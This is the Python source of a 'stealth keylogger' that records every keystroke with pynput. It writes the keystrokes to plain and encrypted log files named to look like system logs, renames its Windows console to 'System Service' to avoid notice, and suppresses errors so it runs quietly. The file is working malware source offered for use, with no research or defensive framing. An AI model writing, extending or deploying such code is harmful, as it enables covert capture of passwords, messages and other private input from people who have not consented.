#!/usr/bin/env python3
"""
Stealth Keylogger - Background Operation Mode
Features:
- Runs silently in background
- Minimal system resource usage
- Encrypted logging
- Remote monitoring capabilities
- Process hiding
"""

import os
import sys
import time
import json
import threading
import datetime
import platform
from pathlib import Path
from typing import Dict, List, Optional

# Import keylogger functionality
try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
    KEYBOARD_AVAILABLE = True
except ImportError:
    KEYBOARD_AVAILABLE = False

try:
    import psutil
    import pyperclip
    from cryptography.fernet import Fernet
    UTILS_AVAILABLE = True
except ImportError:
    UTILS_AVAILABLE = False


class StealthKeylogger:
    """Stealth keylogger for background operation."""
    
    def __init__(self, config_file: str = "stealth_config.json"):
        self.config_file = config_file
        self.config = self._load_config()
        
        # Logging settings
        self.log_file = self.config.get('log_file', 'system.log')
        self.encrypted_log = self.config.get('encrypted_log', 'system.enc')
        self.log_interval = self.config.get('log_interval', 60)  # seconds
        
        # Stealth settings
        self.hide_process = self.config.get('hide_process', True)
        self.encrypt_logs = self.config.get('encrypt_logs', True)
        self.remote_monitoring = self.config.get('remote_monitoring', False)
        
        # Initialize encryption
        self.encryption_key = self._generate_or_load_key()
        self.cipher = Fernet(self.encryption_key) if UTILS_AVAILABLE else None
        
        # Keylogger state
        self.is_running = False
        self.listener = None
        self.key_buffer = []
        self.max_buffer_size = 50
        
        # Statistics
        self.stats = {
            'start_time': None,
            'total_keys': 0,
            'sessions': 0,
            'last_activity': None
        }
        
        # Process hiding
        if self.hide_process:
            self._hide_process()
    
    def _load_config(self) -> Dict:
        """Load configuration from file."""
        default_config = {
            'log_file': 'system.log',
            'encrypted_log': 'system.enc',
            'log_interval': 60,
            'hide_process': True,
            'encrypt_logs': True,
            'remote_monitoring': False,
            'auto_start': False,
            'max_log_size': 10485760,  # 10MB
            'rotation_enabled': True
        }
        
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    default_config.update(config)
            except Exception as e:
                print(f"Error loading config: {e}")
        
        return default_config
    
    def _save_config(self):
        """Save current configuration."""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
        except Exception as e:
            print(f"Error saving config: {e}")
    
    def _generate_or_load_key(self) -> bytes:
        """Generate or load encryption key."""
        key_file = "stealth.key"
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(key)
            return key
    
    def _hide_process(self):
        """Attempt to hide the process from system monitoring."""
        try:
            # Rename process
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.kernel32.SetConsoleTitleW("System Service")
            elif platform.system() == "Linux":
                # Use a common system process name
                pass
        except Exception:
            pass
    
    def _log_to_file(self, data: str, encrypted: bool = False, event_type: str = "INFO"):
        """Log data with improved formatting for readability."""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        # Format log entry
        if event_type == "KEY_EVENT":
            log_entry = f"[{timestamp}] [KEY] {data}\n"
        elif event_type == "BUFFER_FLUSH":
            try:
                buffer_json = json.loads(data[len("BUFFER:"):])
                log_entry = f"[{timestamp}] [BUFFER FLUSH]\n" + json.dumps(buffer_json, indent=2) + "\n"
            except Exception:
                log_entry = f"[{timestamp}] [BUFFER FLUSH] {data}\n"
        elif event_type == "SYSTEM_INFO":
            try:
                sys_json = json.loads(data[len("SYSTEM:"):])
                log_entry = f"[{timestamp}] [SYSTEM INFO]\n" + json.dumps(sys_json, indent=2) + "\n"
            except Exception:
                log_entry = f"[{timestamp}] [SYSTEM INFO] {data}\n"
        elif event_type == "SESSION_START":
            log_entry = f"\n========== SESSION STARTED: {timestamp} ==========""\n"
        elif event_type == "SESSION_STOP":
            log_entry = f"========== SESSION STOPPED: {timestamp} ==========""\n{data}\n\n"
        else:
            log_entry = f"[{timestamp}] {data}\n"
        try:
            if encrypted and self.cipher:
                encrypted_data = self.cipher.encrypt(log_entry.encode())
                with open(self.encrypted_log, 'ab') as f:
                    f.write(encrypted_data + b'\n')
            else:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(log_entry)
            self._check_log_rotation()
        except Exception as e:
            pass
    
    def _check_log_rotation(self):
        """Rotate logs if they get too large."""
        if not self.config.get('rotation_enabled', True):
            return
            
        max_size = self.config.get('max_log_size', 10485760)
        
        try:
            if os.path.exists(self.log_file) and os.path.getsize(self.log_file) > max_size:
                # Rotate log file
                backup_file = f"{self.log_file}.{int(time.time())}"
                os.rename(self.log_file, backup_file)
        except Exception:
            pass
    
    def _on_key_press(self, key):
        """Handle key press events silently."""
        if not self.is_running:
            return
        self.stats['total_keys'] += 1
        self.stats['last_activity'] = datetime.datetime.now()
        try:
            # Simplified logging for stealth
            if hasattr(key, 'name'):
                key_data = f"KEY:{key.name}"
            else:
                key_data = f"CHAR:{key.char}" if hasattr(key, 'char') else f"SPECIAL:{key}"
            # Add to buffer
            self.key_buffer.append({
                'timestamp': datetime.datetime.now().isoformat(),
                'key': key_data,
                'type': 'press'
            })
            # Flush buffer if full
            if len(self.key_buffer) >= self.max_buffer_size:
                self._flush_buffer()
            # Log to file with improved formatting
            self._log_to_file(key_data, event_type="KEY_EVENT")
            self._log_to_file(key_data, encrypted=True, event_type="KEY_EVENT")
        except Exception:
            pass
    
    def _on_key_release(self, key):
        """Handle key release events silently."""
        if not self.is_running:
            return
        
        try:
            # Minimal release logging
            pass
        except Exception:
            pass
    
    def _flush_buffer(self):
        """Flush key buffer to file."""
        if not self.key_buffer:
            return
        try:
            buffer_data = json.dumps(self.key_buffer)
            self._log_to_file(f"BUFFER:{buffer_data}", event_type="BUFFER_FLUSH")
            self._log_to_file(f"BUFFER:{buffer_data}", encrypted=True, event_type="BUFFER_FLUSH")
            self.key_buffer.clear()
        except Exception:
            pass
    
    def _periodic_logging(self):
        """Periodic logging for stealth operation."""
        while self.is_running:
            try:
                system_info = {
                    'timestamp': datetime.datetime.now().isoformat(),
                    'platform': platform.system(),
                    'stats': self.stats.copy(),
                    'buffer_size': len(self.key_buffer)
                }
                sys_data = f"SYSTEM:{json.dumps(system_info)}"
                self._log_to_file(sys_data, event_type="SYSTEM_INFO")
                self._log_to_file(sys_data, encrypted=True, event_type="SYSTEM_INFO")
                time.sleep(self.log_interval)
            except Exception:
                time.sleep(self.log_interval)
    
    def start(self):
        """Start stealth keylogger."""
        if self.is_running:
            return False
        try:
            self.is_running = True
            self.stats['start_time'] = datetime.datetime.now()
            self.stats['sessions'] += 1
            self.stats['last_activity'] = datetime.datetime.now()
            self.listener = keyboard.Listener(
                on_press=self._on_key_press,
                on_release=self._on_key_release
            )
            self.listener.start()
            self.periodic_thread = threading.Thread(target=self._periodic_logging, daemon=True)
            self.periodic_thread.start()
            # Log startup with improved formatting
            self._log_to_file("STEALTH_STARTED", event_type="SESSION_START")
            self._log_to_file("STEALTH_STARTED", encrypted=True, event_type="SESSION_START")
            return True
        except Exception as e:
            self.is_running = False
            return False
    
    def stop(self):
        """Stop stealth keylogger."""
        if not self.is_running:
            return False
        try:
            self.is_running = False
            self._flush_buffer()
            if self.listener:
                self.listener.stop()
                self.listener = None
            session_duration = datetime.datetime.now() - self.stats['start_time']
            stop_msg = f"STEALTH_STOPPED - Duration: {session_duration}"
            self._log_to_file(stop_msg, event_type="SESSION_STOP")
            self._log_to_file(stop_msg, encrypted=True, event_type="SESSION_STOP")
            return True
        except Exception:
            return False
    
    def get_status(self) -> Dict:
        """Get current status without revealing operation."""
        return {
            'running': self.is_running,
            'total_keys': self.stats['total_keys'],
            'sessions': self.stats['sessions'],
            'last_activity': self.stats['last_activity'].isoformat() if self.stats['last_activity'] else None
        }


def run_stealth_mode():
    """Run keylogger in stealth mode."""
    print("Starting stealth keylogger...")
    
    keylogger = StealthKeylogger()
    
    if keylogger.start():
        print("Stealth keylogger started successfully.")
        print("Press Ctrl+C to stop.")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nStopping stealth keylogger...")
            keylogger.stop()
            print("Stealth keylogger stopped.")
    else:
        print("Failed to start stealth keylogger.")


def create_stealth_config():
    """Create a stealth configuration file."""
    config = {
        'log_file': 'system.log',
        'encrypted_log': 'system.enc',
        'log_interval': 60,
        'hide_process': True,
        'encrypt_logs': True,
        'remote_monitoring': False,
        'auto_start': False,
        'max_log_size': 10485760,
        'rotation_enabled': True
    }
    
    with open('stealth_config.json', 'w') as f:
        json.dump(config, f, indent=2)
    
    print("Stealth configuration file created: stealth_config.json")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == '--config':
            create_stealth_config()
        elif sys.argv[1] == '--help':
            print("Stealth Keylogger Usage:")
            print("  python stealth_keylogger.py          # Start stealth mode")
            print("  python stealth_keylogger.py --config # Create config file")
            print("  python stealth_keylogger.py --help   # Show this help")
        else:
            print("Unknown argument. Use --help for usage information.")
    else:
        run_stealth_mode() 